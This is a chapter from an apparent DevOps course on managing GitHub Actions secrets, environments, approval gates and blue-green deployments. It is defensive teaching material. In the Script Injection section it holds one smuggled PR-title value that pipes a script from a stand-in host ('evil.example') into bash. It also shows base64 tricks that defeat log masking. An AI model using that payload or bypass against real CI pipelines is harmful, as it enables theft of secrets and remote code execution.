.. _ch05_secrets_environments:

Secrets and Environment Management
===================================

Twenty-Three Thousand Leaky Pipelines
--------------------------------------

On 14 March 2025, ``tj-actions/changed-files``, a popular GitHub Action used by about
23,000 repositories to list the files a commit changed, started doing something else.
An attacker with access to the action's repository had moved its version tags (``v35``,
``v44``, …) to a malicious commit. Every workflow that used the action by tag ran the
attacker's code on its next run.

The payload read the memory of the runner process, extracted every secret the job had
access to, and printed them to the build log, base64-encoded **twice** so that GitHub's
log masking did not recognise them. In public repositories, build logs are public. For
the hours the tags pointed at the malicious commit, cloud keys, registry passwords and
deploy tokens of thousands of projects were readable by anyone. The incident is tracked
as CVE-2025-30066.

Three lessons from that incident shape this page:

- A secret is exposed to **every piece of code that runs in a job that can read it**.
  That includes every third-party action in the job.
- Log masking is a convenience, not a security boundary.
- A tag like ``@v44`` is a mutable pointer. Repositories that pinned the action to a
  **commit SHA** were not affected.

-----

Three Kinds of Configuration
-----------------------------

.. list-table::
   :header-rows: 1
   :widths: 18 30 26 26

   * - Kind
     - Defined in
     - Syntax
     - Use for
   * - Environment variables
     - The workflow file (``env:`` at workflow, job or step level)
     - ``$NAME`` in shell, ``${{ env.NAME }}``
     - Non-sensitive settings that belong with the code
   * - Configuration variables
     - Settings → Secrets and variables → Actions → **Variables**
     - ``${{ vars.NAME }}``
     - Non-sensitive settings that differ per repo or environment (URLs, feature flags)
   * - Secrets
     - Settings → Secrets and variables → Actions → **Secrets**
     - ``${{ secrets.NAME }}``
     - Anything that grants access: tokens, passwords, private keys

Secrets are encrypted at rest, cannot be read back through the UI or API once saved
(you can only overwrite them), and are **masked** in logs. Use a secret only for things
that really are sensitive. A URL stored as a secret is masked everywhere it appears in
the logs, which makes debugging miserable.

.. warning::

   **Never put a credential in a workflow file, a Dockerfile, a ``.env`` that is
   committed, or a command-line argument.** Workflow files are in the repository,
   readable by anyone who can read the code, forever, including in forks and in every
   clone's history. The ``POSTGRES_PASSWORD: test`` in the ``test-pg`` job is acceptable
   only because it protects a throwaway database inside the runner VM.

-----

Creating and Using a Secret
----------------------------

In the repository: **Settings → Secrets and variables → Actions → New repository
secret**. Name: ``DEPLOY_TOKEN``. Value: any string for now, for example
``dtk_live_7Hq2xR9vLp4mWn8s``.

Pass the secret to the step that needs it as an **environment variable**, then use the
variable in the script:

.. code-block:: yaml

   - name: Deploy
     env:
       DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
     run: |
       curl --fail -H "Authorization: Bearer $DEPLOY_TOKEN" https://deploy.example.com/...

Why not write ``${{ secrets.DEPLOY_TOKEN }}`` directly in the ``run:`` script? GitHub
substitutes ``${{ }}`` expressions **into the script text** before bash runs it. The
secret becomes part of the generated script file, and any quote or ``$`` in the value
changes what the script does. An environment variable is passed as data. The same rule
protects you against script injection (below).

Scope a secret to the **smallest unit that needs it**: put the ``env:`` on the step,
not the job, and certainly not the whole workflow. The ``lint`` job has no business
seeing a deploy token.

-----

Masking and Its Limits
-----------------------

GitHub replaces every occurrence of a secret's value in the log with ``***``:

.. code-block:: yaml

   - name: Show masking
     env:
       DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
     run: echo "Deploying with token: $DEPLOY_TOKEN"

.. code-block:: text

   ▶ Run echo "Deploying with token: $DEPLOY_TOKEN"
   Deploying with token: ***

Masking is a **string search on the log output**, nothing more:

- Any transformation defeats it: ``echo "$DEPLOY_TOKEN" | base64``, ``rev``, printing
  one character per line, URL-encoding. That is how the ``tj-actions`` payload got past
  it.
- A value **derived** from a secret (for example a short-lived token you obtain with
  it) is not a secret to GitHub until you register it with
  ``echo "::add-mask::$DERIVED_TOKEN"``.
- Masking applies to logs only. Files you upload as artifacts, or images you push, are
  not scanned.

The real rule is **never print secrets**, masked or not. Debug with ``test -n
"$DEPLOY_TOKEN" && echo "token is set"``, never by printing the value.

-----

Who Gets Secrets: Forks and Pull Requests
------------------------------------------

On a public repository, anyone can fork the code, change a workflow so that it prints
``${{ secrets.DEPLOY_TOKEN }}``, and open a pull request. GitHub prevents the obvious
attack:

- Workflows triggered by ``pull_request`` **from a fork** receive **no secrets**
  (except a read-only ``GITHUB_TOKEN``).
- For first-time contributors, a maintainer must click **Approve and run** before any
  workflow runs at all.

Your CI workflow needs no secrets, so it works on fork PRs. Deployment workflows must
never run fork code. That is why the ``pull_request_target`` trigger from
:ref:`ch05_actions_basics` is dangerous: it **does** get secrets, and a workflow that
then checks out and runs the PR's code hands those secrets to a stranger.

-----

``GITHUB_TOKEN`` and Least Privilege
-------------------------------------

Every job automatically receives a short-lived token, ``secrets.GITHUB_TOKEN``, scoped
to the repository and valid only while the job runs. Actions like ``checkout`` use it by
default. What it may do is set by ``permissions:``:

.. code-block:: yaml

   permissions:          # workflow default for all jobs
     contents: read

   jobs:
     build-and-push:
       permissions:      # this job needs more; overrides the default for this job only
         contents: read
         packages: write

Older repositories default to a **read/write** token on almost every scope. Newer
repositories and organisations default to read-only, but you cannot tell which from the
workflow file. Declare ``permissions:`` explicitly in every workflow. When a malicious
action runs in a job whose token can only read code, it cannot push commits, create
releases, or publish packages.

-----

Pinning Actions by Commit SHA
------------------------------

A tag can be moved. A commit SHA cannot. To pin an action, look up the commit that the
release tag points to (on the action's **Releases** page, or with the API):

.. code-block:: bash

   $ curl -s https://api.github.com/repos/actions/checkout/git/ref/tags/v7.0.1 \
       | python3 -c 'import sys, json; print(json.load(sys.stdin)["object"]["sha"])'
   3d3c42e5aac5ba805825da76410c181273ba90b1

.. code-block:: yaml

   - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1

The comment records which release the SHA is. Keeping SHA pins up to date by hand is
tedious, so let a bot do it. ``.github/dependabot.yml`` in the solution opens a weekly
PR that bumps both the SHA and the comment, and CI tests the bump like any other change:

.. code-block:: yaml

   version: 2
   updates:
     - package-ecosystem: github-actions
       directory: /
       schedule:
         interval: weekly

How strict to be is a judgement call. ``actions/*`` and ``docker/*`` are maintained by
GitHub and Docker. Many teams pin those to major tags and pin **everything else** by
SHA. The workflows in this chapter use major tags for readability. A team that deploys
to production from these workflows should pin all of them by SHA.

-----

Script Injection
-----------------

Anything an outsider controls is untrusted input: PR titles and bodies, branch names,
commit messages, issue comments. This step looks harmless:

.. code-block:: yaml

   - run: |
       echo "Thanks for the PR: ${{ github.event.pull_request.title }}"

GitHub pastes the title into the script **before** bash runs it. A PR titled
``x"; curl -s https://evil.example/p.sh | bash; echo "`` turns the step into three
commands. ``actionlint`` flags it:

.. code-block:: bash

   $ docker run --rm -v "$PWD":/repo -w /repo rhysd/actionlint:1.7.12 -no-color
   .github/workflows/greet.yml:7:43: "github.event.pull_request.title" is potentially
   untrusted. avoid using it directly in inline scripts. instead, pass it through an
   environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks
   for more details [expression]

The fix is the same one you used for secrets. Pass the value as data:

.. code-block:: yaml

   - env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: |
       echo "Thanks for the PR: $PR_TITLE"

-----

Environments: Staging and Production
-------------------------------------

A GitHub **environment** is a named deployment target with its own secrets, variables,
and **protection rules**. A job opts in with ``environment:``:

.. code-block:: yaml

   deploy-production:
     environment:
       name: production
       url: https://bookshelf.example.com

Create them under **Settings → Environments → New environment**. For each environment
you can configure:

**Environment secrets and variables**
   ``secrets.DEPLOY_TOKEN`` in a job with ``environment: production`` resolves to the
   *production* environment's ``DEPLOY_TOKEN`` if one exists, otherwise to the
   repository secret. Staging and production get different credentials with the same
   workflow code. Environment secrets are only released to a job **after** its
   protection rules pass.

**Required reviewers**
   Up to six people or teams. The job pauses until one of them approves. Optionally
   enable **Prevent self-review**, so that the person who triggered the deployment
   cannot approve it.

**Wait timer**
   Delay the job by N minutes after it is triggered (or approved). This gives monitoring
   time to show problems in staging before production starts.

**Deployment branches and tags**
   Only allow jobs from selected branches (``main``) to use the environment. A workflow
   on a feature branch that says ``environment: production`` fails instead of
   deploying.

.. note::

   On GitHub Free, required reviewers and wait timers are available for **public**
   repositories only. This is one more reason to use a public repository for these labs.

-----

The CD Workflow: Deploy After CI Passes
----------------------------------------

Deployment goes in a second workflow, ``.github/workflows/cd.yml``. It should run only
when CI has **passed** for a commit on ``main``. The ``workflow_run`` trigger does that.
It fires when another workflow finishes:

.. code-block:: yaml

   # Continuous delivery: runs after CI succeeds on main.
   # The deploy steps are placeholders: they print what a real deployment would do.
   name: CD

   on:
     workflow_run:
       workflows: [CI]
       types: [completed]
       branches: [main]

   permissions:
     contents: read

   # Never cancel a deployment halfway; queue the next one instead.
   concurrency:
     group: cd-main
     cancel-in-progress: false

   env:
     # The commit CI tested. github.sha would be the latest commit on main,
     # which is not necessarily the one that passed.
     GIT_SHA: ${{ github.event.workflow_run.head_sha }}

   jobs:
     deploy-staging:
       name: deploy-staging
       # Only commits that passed CI, that were pushed to this repository's main
       # (a fork's PR from a branch called "main" also matches branches: [main]).
       if: >-
         github.event.workflow_run.conclusion == 'success' &&
         github.event.workflow_run.event == 'push' &&
         github.event.workflow_run.head_repository.full_name == github.repository
       runs-on: ubuntu-24.04
       timeout-minutes: 10
       environment:
         name: staging
         url: https://staging.bookshelf.example.com
       steps:
         - name: Deploy to staging
           env:
             DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
           run: |
             if [ -z "$DEPLOY_TOKEN" ]; then
               echo "::error::DEPLOY_TOKEN is not set for the staging environment"
               exit 1
             fi
             echo "Deploying commit $GIT_SHA to staging"

     deploy-production:
       name: deploy-production
       needs: deploy-staging
       runs-on: ubuntu-24.04
       timeout-minutes: 10
       # Protection rules on this environment (required reviewers) pause the job
       # until someone approves it in the GitHub UI.
       environment:
         name: production
         url: https://bookshelf.example.com
       steps:
         - name: Deploy to production
           env:
             DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
           run: |
             if [ -z "$DEPLOY_TOKEN" ]; then
               echo "::error::DEPLOY_TOKEN is not set for the production environment"
               exit 1
             fi
             echo "Deploying commit $GIT_SHA to production"

The details of ``workflow_run`` are easy to get wrong:

- It fires on **every** completed CI run, including failed ones and pull request runs.
  ``branches: [main]`` filters on the *head branch name*, and a fork's PR from its own
  branch called ``main`` matches too. The ``if:`` checks all three things that matter:
  CI succeeded, the run was triggered by a push, and the code came from this
  repository.
- Inside the CD run, ``github.sha`` is the **latest commit on the default branch**, not
  the commit CI tested. If two merges land close together, they differ. Always use
  ``github.event.workflow_run.head_sha``.
- ``workflow_run`` only triggers workflow files that are on the **default branch**. A
  ``cd.yml`` that exists only on your feature branch never runs. Merge it first.
- ``concurrency`` with ``cancel-in-progress: false`` queues deployments instead of
  killing one midway. A half-finished deployment is worse than a late one.

.. admonition:: Observation:

   The deploy step checks that ``DEPLOY_TOKEN`` is set and fails with a clear
   ``::error::`` annotation if it is not. A missing secret evaluates to an **empty
   string**, not an error. Without the check, a deployment script would run with an
   empty token and fail later with a confusing 401, or, worse, succeed against an
   endpoint that does not check.

-----

The Approval Flow
------------------

With a required reviewer on ``production``, a push to ``main`` produces this sequence:

.. code-block:: text

   CI #42   ✓ lint  ✓ test  ✓ test-pg  ✓ build
     │
     ▼ workflow_run (success, push, main)
   CD #17   ✓ deploy-staging ──▶ ⏸ deploy-production   Waiting for review
                                    │
            ┌───────────────────────┴───────────────────────────────────┐
            │ Review pending deployments                                │
            │                                                           │
            │ ☑ production   https://bookshelf.example.com              │
            │                                                           │
            │ Leave a comment: Staging smoke test OK.                   │
            │                                                           │
            │               [ Reject ]   [ Approve and deploy ]         │
            └───────────────────────────────────────────────────────────┘

The reviewer gets a notification. Approval or rejection is recorded with their name and
comment. The repository's **Deployments** view (right sidebar on the main page) lists
every deployment per environment: which commit, who approved it, and when. In the
Knight Capital story from :ref:`ch05_cicd_concepts`, nobody could quickly answer "what
is running where?". This view records that for every deployment.

-----

.. _ch05_blue_green:

Blue-Green Deployments
-----------------------

Staging and the approval gate decide *whether* a release goes to production. They say
nothing about *how* it replaces the running version. The naive way is to stop the old
containers and start the new ones in the same place. That has two problems: there is a
window where the API is down or half-updated, and if the new version is broken, rolling
back means another deployment under pressure.

A **blue-green deployment** keeps two complete, identical production environments.
One of them (say **blue**) serves all traffic. The new release goes to the idle one
(**green**), and the switch is a single change at the router or load balancer:

.. code-block:: text

   Before the switch                      After the switch

           users                                  users
             │                                      │
        ┌────▼────┐                            ┌────▼────┐
        │ router  │                            │ router  │
        └────┬────┘                            └────┬────┘
             │                                      └──────────────┐
             ▼                                                     ▼
   ┌────────────────┐ ┌────────────────┐   ┌────────────────┐ ┌────────────────┐
   │ blue  (live)   │ │ green  (new)   │   │ blue  (idle)   │ │ green  (live)  │
   │ bookshelf:a1b2 │ │ bookshelf:c3d4 │   │ bookshelf:a1b2 │ │ bookshelf:c3d4 │
   └───────┬────────┘ └───────┬────────┘   └───────┬────────┘ └───────┬────────┘
           └─────────┬────────┘                    └─────────┬────────┘
               ┌─────▼──────┐                          ┌─────▼──────┐
               │ PostgreSQL │                          │ PostgreSQL │
               └────────────┘                          └────────────┘

The deployment becomes three steps:

#. **Deploy** the new image (``bookshelf:<sha>``, the one CI built and staging ran) to
   the idle color. Users see nothing yet.
#. **Verify** the idle color directly, bypassing the router: ``/health``, a smoke test,
   a look at the logs.
#. **Switch** the router to the new color. Every new request goes to the new version
   at once.

**Rollback is switching back.** The old color is still running, with the old image,
already warm. Undoing a bad release takes seconds and needs no build, no pull, and no
approval. This is the "rehearsed, automated rollback" that Knight Capital did not have.
After a while without problems, the old color is updated to the next release, or shut
down to save money until the next deployment.

The idea fits this chapter's pieces. The image is immutable and tagged by SHA, so
"blue runs ``a1b2``, green runs ``c3d4``" is exact. In a real ``cd.yml``, the production
job would deploy to the idle color and run a smoke test, and a second job, behind the
approval gate, would perform the switch.

What blue-green does **not** solve:

- **The database is shared.** Both colors talk to the same PostgreSQL, so the schema
  must work with the old *and* the new code at the same time. A migration that renames
  a column breaks blue the moment it runs, and makes "switch back" useless. The usual
  approach is **expand, then contract**: add the new column in one release, move the
  code to it, and drop the old column in a later release, once no running version uses
  it.
- **It costs double.** Two full production environments, even if one is idle most of
  the time.
- **Everyone moves at once.** A bug that only shows up under real traffic reaches
  100% of users at the moment of the switch. You find out fast and roll back fast, but
  everyone is affected in between.

Two related strategies trade these differently:

.. list-table::
   :header-rows: 1
   :widths: 18 42 40

   * - Strategy
     - How it switches
     - Trade-off
   * - **Blue-green**
     - All traffic moves from the old environment to the new one in one step
     - Instant rollback; double capacity; all users hit by a bad release
   * - **Rolling**
     - Instances are replaced a few at a time (the default in Kubernetes)
     - No extra environment; old and new versions serve traffic together during the
       rollout; rollback is another rollout
   * - **Canary**
     - A small share of traffic (say 5%) goes to the new version first, then more
       if the metrics stay healthy
     - Limits the damage of a bad release; needs good monitoring to decide when to
       continue

Canary releases depend on comparing error rates and latency between versions, which is
what Chapters 8 and 9 build. Our deploy jobs remain placeholders, but whichever
strategy a team picks, it plugs into the same pipeline: one image, built once, promoted
through staging and an approval gate.

-----

**Exercises**

#. Create a repository secret ``DEPLOY_TOKEN`` with a made-up value. Add a temporary
   workflow, or a temporary step in ``cd.yml``, that runs:

   .. code-block:: bash

      echo "Deploying with token: $DEPLOY_TOKEN"

   with the secret passed through ``env:``. Push and confirm that the log shows
   ``***``. Then add ``echo "$DEPLOY_TOKEN" | base64`` and look at the log again. Is
   the output masked? Decode it locally with ``base64 -d``. Remove the step, and
   **rotate** (overwrite) the secret: you just leaked it into a public log.

#. Create the ``staging`` and ``production`` environments. On ``production``:

   - add yourself as a required reviewer (leave **Prevent self-review** unchecked so
     you can approve your own deployment)
   - restrict deployment branches to ``main``
   - add an environment secret ``DEPLOY_TOKEN`` with a value different from the
     repository secret

   Add ``cd.yml`` as shown above, push to ``main``, and follow the run. Approve the
   production deployment from the run page. Afterwards, find both deployments in the
   repository's **Deployments** view.

#. Delete the repository-level ``DEPLOY_TOKEN`` (keep the production one) and push
   again. What happens to ``deploy-staging``? Where does the ``::error::`` message
   appear in the UI?

#. Remove the ``environment:`` key from ``deploy-production`` on a scratch branch and
   run ``actionlint``. It passes. Explain why this one-line change would be dangerous,
   and which reviewer in a PR should catch it.

#. Save the vulnerable ``greet.yml`` example from **Script Injection** in a scratch
   directory, run ``actionlint`` on it, then fix it with an ``env:`` variable and
   confirm the warning is gone.

#. Add ``permissions: contents: read`` to ``ci.yml`` (if you have not already). Then
   look up which permissions ``docker/build-push-action`` needs to push to ``ghcr.io``.
   You will need the answer on the next page.

#. **(Optional)** Pin every action in ``ci.yml`` to a commit SHA with a ``# vX.Y.Z``
   comment, and add ``.github/dependabot.yml`` for the ``github-actions`` ecosystem.
   After a week, check whether Dependabot opened a PR.
